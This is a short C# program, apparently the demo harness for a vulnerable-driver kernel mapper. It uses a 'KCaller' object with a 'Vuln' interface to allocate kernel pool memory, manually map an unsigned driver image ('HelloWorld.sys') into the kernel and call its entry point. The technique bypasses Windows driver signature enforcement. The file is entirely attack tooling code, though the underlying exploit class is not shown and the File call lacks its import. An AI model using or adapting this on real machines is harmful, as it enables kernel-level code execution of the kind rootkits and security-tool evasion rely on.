using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

class Program
{
    static IntPtr LoadFileNative(string path, out int size)
    {
        byte[] data = File.ReadAllBytes(path);
        size = data.Length;
        int alignedSize = (size + 0xFFF) & ~0xFFF;

        IntPtr ptr = Marshal.AllocHGlobal(alignedSize);
        Marshal.Copy(data, 0, ptr, size);
        return ptr;
    }

    static void Main(string[] args)
    {


        using (var kc = new KCaller())
        {
            Console.WriteLine("Calling ExAllocatePoolWithTag...");


            ulong result = kc.ExAllocatePoolWithTag(
                poolType: 0,
                size: 0x1000,
                tag: 0xDEAD
            );

            Console.WriteLine("Allocated kernel memory at: 0x" + result.ToString("X"));

            int size;
            IntPtr imageIn = LoadFileNative("HelloWorld.sys", out size);

            ulong driverEntry = kc.Vuln.MMapKernelPeImage(
                imageIn
            );

            ulong retVal = 0;
            kc.Vuln.CallKernelFunction(driverEntry, out retVal);
            Console.WriteLine("ret: 0x" + retVal.ToString("X"));

        }

    }
}
